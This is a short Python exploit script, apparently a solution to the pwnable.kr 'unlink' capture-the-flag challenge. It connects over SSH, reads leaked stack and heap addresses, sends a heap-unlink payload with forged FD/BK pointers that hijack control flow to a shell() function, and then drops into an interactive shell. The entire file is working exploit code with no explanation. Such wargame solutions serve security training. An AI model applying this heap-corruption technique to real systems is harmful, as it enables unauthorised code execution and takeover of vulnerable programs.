from pwn import *

p = ssh("unlink", "pwnable.kr", 2222, "guest").process("/home/unlink/unlink")

shell = 0x80484EB  # shell()

# leak stack and heap
p.recvuntil(b"here is stack address leak: 0x")
esp = int(p.recvline()[:-1], 16) - 0x14  # esp of main()
p.recvuntil(b"here is heap address leak: 0x")
heapbase = int(p.recvline()[:-1], 16) - 0x410  # heapbase
log.info("esp of main(): " + hex(esp))
log.info("heapbase: " + hex(heapbase))

# call shell()
payload = b"A" * 0x10  # dummy
payload += p32(heapbase + 0x430 + 4)  # FD
payload += p32(esp + 0x28 - 4)  # BK
payload += p32(shell)  # heapbase + 0x430

p.sendlineafter(b"now that you have leaks, get shell!\n", payload)

p.interactive()
